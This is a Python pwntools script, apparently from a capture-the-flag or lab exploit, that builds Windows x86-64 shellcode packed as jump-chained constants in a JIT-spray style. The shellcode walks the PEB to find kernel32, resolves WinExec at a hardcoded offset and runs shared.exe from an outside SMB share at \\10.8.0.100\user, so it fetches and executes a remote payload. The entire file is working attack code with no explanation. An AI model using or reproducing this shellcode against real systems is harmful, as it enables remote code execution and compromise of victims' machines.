#!/usr/bin/python3
from pwn import asm, context

shared = b"\\\\10.8.0.100\\user\\shared.exe"[::-1].hex()

context.arch = "amd64"

shellcode = [
    asm("xor rcx, rcx"),                    # $rcx = TEB structure
    asm("mov rsi, gs:[rcx + 0x60]"),        # $rsi = PEB structure
    asm("mov rsi, [rsi + 0x18]"),           # $rsi = PEB Loader
    asm("mov rsi, [rsi + 0x20]"),           # $rsi = InMemoryOrderModuleList
    asm("mov rsi, [rsi]; lodsq"),           # $rsi = kernel32.dll
    asm("mov rbx, [rax + 0x20]"),           # $rbx = kernel32 base
    asm("mov ecx, 0x1280"),                 # $rcx = offset to WinExec()
    asm("add rbx, rcx"),                    # $rbx = WinExec()
    asm("push 0x" + shared[0:8]),           # $rsp = &".exe"
    asm("xor rax, rax"),                    # $rax = 0x0
    asm("mov eax, 0x" + shared[8:16]),      # $rax = "ared"
    asm("shl rax, 0x20"),                   # $rax = "????ared"
    asm("or rax, 0x" + shared[16:24]),      # $rax = "r\shared"
    asm("push rax"),                        # $rsp = &"r\shared.exe"
    asm("mov eax, 0x" + shared[24:32]),     # $rax = "\use"
    asm("nop; shl rax, 0x20"),              # $rax = "????\use"
    asm("or rax, 0x" + shared[32:40]),      # $rax = ".100\use"
    asm("nop; push rax"),                   # $rsp = &".100\user\shared.exe"
    asm("mov eax, 0x" + shared[40:48]),     # $rax = ".8.0"
    asm("nop; nop; shl rax, 0x20"),         # $rax = "????.8.0"
    asm("or rax, 0x" + shared[48:56]),      # $rax = "\\10.8.0"
    asm("nop; nop; push rax"),              # $rsp = &"\\10.8.0.100\user\shared.exe"
    asm("mov rcx, rsp; push 0x5; pop rdx"), # $rcx = string; $rdx = SW_SHOW
    asm("sub rsp, 0x30; call rbx")          # call WinExec(string, SW_SHOW)
]

for i in range(len(shellcode)):
    shellcode[i] = shellcode[i].ljust(6, asm("nop"))
    if i != len(shellcode) - 1:
        if i < 7:
            shellcode[i] += asm("jmp $+0x9")
        elif i > 6 and i < 19:
            shellcode[i] += asm("jmp $+0xe")
        elif i > 18:
            shellcode[i] += asm("jmp $+0x11")

    shellcode[i] = int(shellcode[i][::-1].hex(), 16)
    print(hex(shellcode[i]) + "n,")
